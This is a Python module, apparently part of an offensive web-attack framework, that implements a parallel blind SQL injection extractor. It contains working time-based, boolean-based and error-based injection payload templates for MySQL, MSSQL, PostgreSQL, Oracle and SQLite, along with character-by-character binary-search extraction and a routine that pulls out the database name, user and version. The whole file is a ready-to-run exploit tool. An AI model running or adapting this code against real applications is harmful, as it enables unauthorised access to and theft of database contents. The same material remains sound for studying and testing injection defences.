"""Parallel Blind SQL Injection data extractor."""

import asyncio
from dataclasses import dataclass
from typing import Optional, Callable
from enum import Enum

from ...core.http_client import HttpClient, Response
from ...core.context import AttackContext
from ...utils.logger import log_info, log_success, log_warning


class BlindTechnique(Enum):
    """Blind SQLi detection technique."""
    TIME = "time"
    BOOLEAN = "boolean"
    ERROR = "error"


class DatabaseType(Enum):
    """Supported database types."""
    MYSQL = "mysql"
    MSSQL = "mssql"
    POSTGRESQL = "postgresql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


@dataclass
class ExtractionResult:
    """Result of blind extraction."""
    success: bool
    value: str
    requests_made: int
    technique: BlindTechnique
    db_type: DatabaseType


class ParallelBlindExtractor:
    """
    High-performance parallel blind SQL injection data extractor.

    Features:
    - Parallel character extraction (3x faster)
    - Adaptive charset based on first few characters
    - Exponential + binary search for length detection
    - DB-specific optimizations
    """

    # Character sets ordered by frequency
    CHARSET_NUMERIC = "0123456789"
    CHARSET_ALPHA_LOWER = "etaoinshrdlcumwfgypbvkjxqz"
    CHARSET_ALPHA_UPPER = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    CHARSET_HEX = "0123456789abcdef"
    CHARSET_COMMON = "etaoinshrdlcumwfgypbvkjxqz0123456789_-"
    CHARSET_FULL = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}!@#$%^&*()[]|;:',.<>?/\\`~"

    # DB-specific templates
    DB_TEMPLATES = {
        DatabaseType.MYSQL: {
            "length": "LENGTH(({query}))",
            "char": "ASCII(SUBSTRING(({query}),{pos},1))",
            "time_if": "IF({condition},SLEEP({delay}),0)",
            "time_sleep": "SLEEP({delay})",
            "error_if": "IF({condition},(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a),0)",
        },
        DatabaseType.MSSQL: {
            "length": "LEN(({query}))",
            "char": "ASCII(SUBSTRING(({query}),{pos},1))",
            "time_if": "IF({condition}) WAITFOR DELAY '0:0:{delay}'",
            "time_sleep": "WAITFOR DELAY '0:0:{delay}'",
            "error_if": "IF({condition}) (SELECT 1/0)",
        },
        DatabaseType.POSTGRESQL: {
            "length": "LENGTH(({query}))",
            "char": "ASCII(SUBSTRING(({query}),{pos},1))",
            "time_if": "CASE WHEN ({condition}) THEN PG_SLEEP({delay}) ELSE PG_SLEEP(0) END",
            "time_sleep": "PG_SLEEP({delay})",
            "error_if": "CASE WHEN ({condition}) THEN 1/0 ELSE 1 END",
        },
        DatabaseType.ORACLE: {
            "length": "LENGTH(({query}))",
            "char": "ASCII(SUBSTR(({query}),{pos},1))",
            "time_if": "CASE WHEN ({condition}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 0 END",
            "time_sleep": "DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})",
            "error_if": "CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '1' END",
        },
        DatabaseType.SQLITE: {
            "length": "LENGTH(({query}))",
            "char": "UNICODE(SUBSTR(({query}),{pos},1))",
            "time_if": "CASE WHEN ({condition}) THEN (SELECT {query} FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) LIMIT 999999999) ELSE 0 END",
            "time_sleep": "",  # SQLite has no sleep
            "error_if": "CASE WHEN ({condition}) THEN 1/0 ELSE 1 END",
        },
    }

    def __init__(
        self,
        ctx: AttackContext,
        technique: BlindTechnique = BlindTechnique.TIME,
        db_type: DatabaseType = DatabaseType.MYSQL,
        parallelism: int = 3,
        delay: float = 3.0,
    ):
        """
        Initialize parallel blind extractor.

        Args:
            ctx: Attack context
            technique: Detection technique (time, boolean, error)
            db_type: Target database type
            parallelism: Number of parallel character extractions
            delay: Time delay for time-based detection (seconds)
        """
        self.ctx = ctx
        self.technique = technique
        self.db_type = db_type
        self.parallelism = parallelism
        self.delay = delay
        self.client = HttpClient(ctx)
        self.requests_made = 0

        # Get DB-specific templates
        self.templates = self.DB_TEMPLATES.get(
            db_type,
            self.DB_TEMPLATES[DatabaseType.MYSQL]
        )

        # Baseline for boolean detection
        self.baseline_true: Optional[Response] = None
        self.baseline_false: Optional[Response] = None

    async def setup(self) -> bool:
        """
        Setup extractor and verify injection works.

        Returns:
            True if injection is verified
        """
        if self.technique == BlindTechnique.TIME:
            # Test time-based injection
            return await self._verify_time_injection()
        elif self.technique == BlindTechnique.BOOLEAN:
            # Setup baseline responses
            return await self._setup_boolean_baselines()
        else:
            return True

    async def _verify_time_injection(self) -> bool:
        """Verify time-based injection works."""
        # Send baseline request
        baseline = await self.client.request()
        baseline_time = baseline.elapsed

        # Send delay request
        sleep_template = self.templates.get("time_sleep", "")
        if not sleep_template:
            log_warning(f"Time-based not supported for {self.db_type}")
            return False

        payload = f"' AND {sleep_template.format(delay=int(self.delay))}--"
        delayed = await self.client.request_with_payload(payload)

        # Check if delay worked
        time_diff = delayed.elapsed - baseline_time
        success = time_diff >= (self.delay * 0.8)

        if success:
            log_success(f"Time-based injection verified (delay: {time_diff:.2f}s)")
        else:
            log_warning(f"Time-based injection not verified (delay: {time_diff:.2f}s)")

        return success

    async def _setup_boolean_baselines(self) -> bool:
        """Setup baseline responses for boolean detection."""
        # True condition
        true_payload = "' AND '1'='1"
        self.baseline_true = await self.client.request_with_payload(true_payload)

        # False condition
        false_payload = "' AND '1'='2"
        self.baseline_false = await self.client.request_with_payload(false_payload)

        # Check if there's a difference
        length_diff = abs(self.baseline_true.content_length - self.baseline_false.content_length)

        if length_diff > 50:
            log_success(f"Boolean injection verified (length diff: {length_diff})")
            return True
        elif self.baseline_true.status_code != self.baseline_false.status_code:
            log_success(f"Boolean injection verified (status diff)")
            return True
        else:
            log_warning("Boolean injection not verified - responses too similar")
            return False

    async def extract_length(
        self,
        query: str,
        max_length: int = 1000
    ) -> int:
        """
        Extract length of query result using exponential + binary search.

        Args:
            query: SQL query
            max_length: Maximum possible length

        Returns:
            Length of result
        """
        length_expr = self.templates["length"].format(query=query)

        # Exponential search to find upper bound
        upper = 1
        while upper < max_length:
            condition = f"{length_expr}>={upper}"
            if await self._check_condition(condition):
                upper *= 2
            else:
                break

        # Binary search
        low, high = upper // 2, min(upper, max_length)

        while low <= high:
            mid = (low + high) // 2
            condition = f"{length_expr}>{mid}"

            if await self._check_condition(condition):
                low = mid + 1
            else:
                high = mid - 1

        log_info(f"Detected length: {low}")
        return low

    async def extract_string(
        self,
        query: str,
        max_length: int = 100,
        adaptive_charset: bool = True,
        progress_callback: Optional[Callable[[str, int, int], None]] = None
    ) -> ExtractionResult:
        """
        Extract string using parallel binary search.

        Args:
            query: SQL query that returns a string
            max_length: Maximum string length
            adaptive_charset: Whether to adapt charset based on detected characters
            progress_callback: Called with (current_value, position, total)

        Returns:
            ExtractionResult with extracted value
        """
        self.requests_made = 0

        # Detect length first
        length = await self.extract_length(query, max_length)
        if length == 0:
            return ExtractionResult(
                success=True,
                value="",
                requests_made=self.requests_made,
                technique=self.technique,
                db_type=self.db_type,
            )

        # Determine charset
        charset = self.CHARSET_FULL
        if adaptive_charset:
            charset = await self._detect_optimal_charset(query, length)

        # Extract characters in parallel batches
        result = ["?"] * length

        for batch_start in range(0, length, self.parallelism):
            batch_end = min(batch_start + self.parallelism, length)
            positions = list(range(batch_start + 1, batch_end + 1))

            # Extract batch in parallel
            tasks = [
                self._extract_char_binary(query, pos, charset)
                for pos in positions
            ]
            chars = await asyncio.gather(*tasks)

            # Update result
            for i, char in enumerate(chars):
                if char:
                    result[batch_start + i] = char

            current_value = "".join(result).replace("?", "")
            if progress_callback:
                progress_callback(current_value, batch_end, length)

            if self.ctx.verbose:
                log_info(f"Progress: {''.join(result[:batch_end])}...")

        final_value = "".join(result).replace("?", "")
        log_success(f"Extracted: {final_value}")

        return ExtractionResult(
            success=True,
            value=final_value,
            requests_made=self.requests_made,
            technique=self.technique,
            db_type=self.db_type,
        )

    async def _detect_optimal_charset(
        self,
        query: str,
        length: int
    ) -> str:
        """Detect optimal charset based on first few characters."""
        if length == 0:
            return self.CHARSET_FULL

        # Sample first character
        first_char = await self._extract_char_binary(query, 1, self.CHARSET_FULL)

        if not first_char:
            return self.CHARSET_FULL

        # Determine charset type
        if first_char.isdigit():
            # Check if all numeric (likely ID, hash, etc.)
            log_info("Detected numeric-like data, using optimized charset")
            return self.CHARSET_NUMERIC + self.CHARSET_HEX + "_-"
        elif first_char.lower() == first_char and first_char.isalpha():
            # Lowercase - likely username, table name
            log_info("Detected lowercase data, using optimized charset")
            return self.CHARSET_ALPHA_LOWER + self.CHARSET_NUMERIC + "_-"
        else:
            return self.CHARSET_COMMON + self.CHARSET_ALPHA_UPPER + "!@#$%^&*(){}"

    async def _extract_char_binary(
        self,
        query: str,
        position: int,
        charset: str
    ) -> Optional[str]:
        """Extract single character using binary search."""
        char_expr = self.templates["char"].format(query=query, pos=position)

        # Binary search on ASCII value
        low, high = 0, 127

        while low <= high:
            mid = (low + high) // 2
            condition = f"{char_expr}>{mid}"

            if await self._check_condition(condition):
                low = mid + 1
            else:
                high = mid - 1

        if 32 <= low <= 126:
            return chr(low)
        elif low == 0:
            return None  # End of string
        else:
            return "?"

    async def _check_condition(self, condition: str) -> bool:
        """
        Check if SQL condition is true.

        Args:
            condition: SQL condition to test

        Returns:
            True if condition is true
        """
        self.requests_made += 1

        if self.technique == BlindTechnique.TIME:
            return await self._check_time_condition(condition)
        elif self.technique == BlindTechnique.BOOLEAN:
            return await self._check_boolean_condition(condition)
        else:
            return await self._check_error_condition(condition)

    async def _check_time_condition(self, condition: str) -> bool:
        """Check condition using time-based detection."""
        time_template = self.templates["time_if"]
        payload = f"' AND {time_template.format(condition=condition, delay=int(self.delay))}--"

        response = await self.client.request_with_payload(payload)
        return response.elapsed >= (self.delay * 0.8)

    async def _check_boolean_condition(self, condition: str) -> bool:
        """Check condition using boolean-based detection."""
        payload = f"' AND ({condition})--"
        response = await self.client.request_with_payload(payload)

        if not self.baseline_true or not self.baseline_false:
            return False

        # Compare with baselines
        true_diff = abs(response.content_length - self.baseline_true.content_length)
        false_diff = abs(response.content_length - self.baseline_false.content_length)

        return true_diff < false_diff

    async def _check_error_condition(self, condition: str) -> bool:
        """Check condition using error-based detection."""
        error_template = self.templates.get("error_if", "")
        if not error_template:
            return False

        payload = f"' AND {error_template.format(condition=condition)}--"
        response = await self.client.request_with_payload(payload)

        # Error usually means condition was true
        return response.status_code == 500 or "error" in response.text.lower()

    async def extract_schema_info(self) -> dict:
        """
        Extract basic schema information.

        Returns:
            Dict with database, user, version info
        """
        results = {}

        queries = {
            DatabaseType.MYSQL: {
                "database": "DATABASE()",
                "user": "USER()",
                "version": "VERSION()",
            },
            DatabaseType.MSSQL: {
                "database": "DB_NAME()",
                "user": "SYSTEM_USER",
                "version": "@@VERSION",
            },
            DatabaseType.POSTGRESQL: {
                "database": "CURRENT_DATABASE()",
                "user": "CURRENT_USER",
                "version": "VERSION()",
            },
            DatabaseType.ORACLE: {
                "database": "SYS_CONTEXT('USERENV','DB_NAME')",
                "user": "USER",
                "version": "BANNER FROM V$VERSION WHERE ROWNUM=1",
            },
            DatabaseType.SQLITE: {
                "database": "'main'",
                "version": "SQLITE_VERSION()",
            },
        }

        db_queries = queries.get(self.db_type, queries[DatabaseType.MYSQL])

        for key, query in db_queries.items():
            try:
                result = await self.extract_string(query, max_length=100, adaptive_charset=True)
                if result.success:
                    results[key] = result.value
            except Exception as e:
                log_warning(f"Failed to extract {key}: {e}")

        return results

    async def close(self) -> None:
        """Close HTTP client."""
        await self.client.close()

    async def __aenter__(self):
        await self.setup()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
